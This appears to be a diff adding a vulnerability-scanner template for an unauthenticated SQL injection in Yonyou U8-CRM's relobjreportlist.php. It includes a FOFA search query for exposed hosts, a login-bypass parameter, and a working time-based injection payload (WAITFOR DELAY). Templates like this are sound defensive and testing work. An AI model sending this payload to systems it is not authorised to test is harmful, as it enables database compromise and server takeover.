@@ -1,0 +1,35 @@
+id: yonyou-crm-relobjreportlist-sqli
+
+info:
+  name: Yonyou U8-CRM relobjreportlist.php - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the config/relobjrReportlist.chp file of the UFIDA U8 CRM customer relationship management system. Unauthenticated attackers can execute arbitrary SQL statements, call xp_cmdshell to write backdoor files, execute arbitrary code, and gain server privileges through the vulnerability.
+    Scope of Impact: V18, V16.5, V16.1, V16.0, V15.1, V13
+  reference:
+    - https://mp.weixin.qq.com/s/ZKtY6PN3ahGSEUIL9npc1g
+  metadata:
+    fofa-query: app="用友U8CRM"
+  tags: 用友-U8-CRM
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
+
+
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration>=5"
+          - contains(body, 'WAITFOR DELAY')
+        condition: and
